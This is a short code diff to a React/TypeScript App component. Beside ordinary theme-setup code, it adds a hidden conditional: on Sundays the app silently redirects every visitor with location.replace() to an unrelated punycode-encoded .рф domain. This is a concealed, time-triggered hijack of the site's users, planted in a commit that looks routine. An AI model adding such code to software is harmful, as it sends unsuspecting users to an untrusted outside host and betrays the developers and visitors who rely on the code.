@@ -5,6 +5,10 @@ import * as Pages from "./views";
 import { Navigation, NotFoundError } from "./components";
 
 function App() {
+  if (new Date().getDay() === 0) {
+    location.replace("https://xn----8sbaqd1aje6bf1c2g.xn--p1ai/mobile/");
+  }
+
   const colorScheme = window.matchMedia("(prefers-color-scheme: dark)");
   const [mode, setMode] = useState<"light" | "dark">(colorScheme.matches ? "dark" : "light");
   const theme = useMemo(() => createTheme({
